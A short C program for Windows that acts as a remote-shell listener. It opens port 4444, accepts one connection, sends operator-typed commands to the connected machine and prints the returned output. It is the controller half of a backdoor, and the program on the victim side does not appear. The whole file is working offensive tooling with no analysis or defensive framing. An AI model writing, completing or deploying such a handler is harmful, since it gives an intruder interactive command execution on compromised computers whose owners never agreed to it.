#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int client_len = sizeof(client_addr);
    char buffer[8192];
    char command[1024];

    WSAStartup(MAKEWORD(2,2), &wsa);
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(4444);

    bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_socket, 1);

    printf("[+] Waiting for connection...\n");
    client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
    printf("[+] Connected from %s\n\n", inet_ntoa(client_addr.sin_addr));

    while (1) {
        printf("Shell> ");
        fgets(command, sizeof(command), stdin);
        command[strcspn(command, "\n")] = 0;  // remove newline

        if (strcmp(command, "exit") == 0 || strcmp(command, "quit") == 0) {
            send(client_socket, "exit", 5, 0);
            break;
        }

        send(client_socket, command, strlen(command), 0);
        send(client_socket, "\n", 1, 0);

        // receive response
        while (1) {
            int bytes = recv(client_socket, buffer, sizeof(buffer)-1, 0);
            if (bytes <= 0) break;
            buffer[bytes] = '\0';
            
            if (strstr(buffer, "END_OF_OUTPUT")) {
                printf("%s", buffer);
                break;
            }
            printf("%s", buffer);
        }
    }

    closesocket(client_socket);
    closesocket(server_socket);
    WSACleanup();
    return 0;
}